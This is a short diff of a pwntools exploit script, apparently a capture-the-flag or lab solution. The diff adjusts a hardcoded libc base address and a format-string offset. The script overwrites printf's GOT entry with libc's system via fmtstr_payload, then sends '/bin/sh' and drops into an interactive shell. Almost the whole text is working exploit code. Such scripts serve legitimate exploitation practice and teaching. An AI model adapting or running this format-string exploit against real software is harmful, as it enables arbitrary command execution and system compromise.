@@ -9,10 +9,11 @@ io = process()
 libc = elf.libc
 
 
-libc.address = 0x00007f96789ea000		# ASLR disabled
+libc.address = 0x00007ffff7daf000		# ASLR disabled
+
+payload = fmtstr_payload(6, {elf.got['printf'] : libc.sym['system']})
 
 
-payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
 io.sendline(payload)
 
 io.sendline('/bin/sh')
@@ -20,3 +21,6 @@ io.sendline('/bin/sh')
 
 io.clean()
 io.interactive()
+
+
+
